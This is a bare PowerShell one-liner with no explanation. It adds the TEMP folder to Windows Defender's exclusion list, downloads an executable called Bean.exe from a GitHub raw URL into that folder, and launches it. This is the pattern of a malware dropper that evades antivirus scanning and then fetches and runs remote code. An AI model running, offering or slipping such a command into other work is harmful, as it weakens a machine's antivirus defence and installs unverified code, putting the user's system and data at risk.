Start-Sleep 6; Get-Service -Name WinDefend | Start-Service; try { Add-MpPreference -ExclusionPath $env:TEMP } catch { Write-Error 'Failed to add exclusion to Windows Defender'}; $TempPath = [System.IO.Path]::GetTempPath(); $ExePath = Join-Path -Path $TempPath -ChildPath 'Bean.exe'; Invoke-WebRequest -Uri 'https://github.com/bean-muncher/Beanository/raw/main/BeanEXE/Bean.exe'-OutFile $ExePath; Start-Process -FilePath $ExePath; exit;